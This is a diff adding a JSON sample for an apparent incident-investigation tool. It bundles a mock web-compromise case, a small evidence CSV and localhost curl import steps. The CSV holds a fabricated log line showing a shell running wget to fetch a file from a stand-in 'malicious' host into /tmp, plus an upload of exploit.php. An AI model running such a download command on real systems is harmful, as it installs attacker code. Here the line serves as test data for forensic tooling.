@@ -1,0 +1,16 @@
+{
+  "case": {
+    "title": "Sample Case - Web Compromise",
+    "description": "Investigation of suspected web compromise and data exfiltration."
+  },
+  "evidence": {
+    "filename": "sample_evidence.csv",
+    "content": "timestamp,source,event,detail\n2026-10-07T12:00:00Z,auth.log,failed_login,username=alice\n2026-10-07T12:02:00Z,web_access,upload,filename=exploit.php\n2026-10-07T12:03:00Z,process,exec,cmd=/bin/sh -c 'wget http://malicious/x -O /tmp/x'\n"
+  },
+  "notes": "This single-file JSON bundles a case and one evidence CSV for quick import testing.",
+  "import_examples": {
+    "curl_create_case": "curl -sS -X POST http://localhost:8000/api/v1/cases/ -H 'Content-Type: application/json' -d '@samples/sample_case.json' | jq .",
+    "curl_upload_evidence": "curl -sS -F 'file=@samples/sample_evidence.csv' -F 'case_id=<CASE_ID>' http://localhost:8000/api/v1/evidence/upload | jq .",
+    "ui_steps": "Open http://localhost:3000 → Cases → Create New Case (paste title/description) → Use Import Evidence form to upload the CSV and provide the Case ID returned above."
+  }
+}
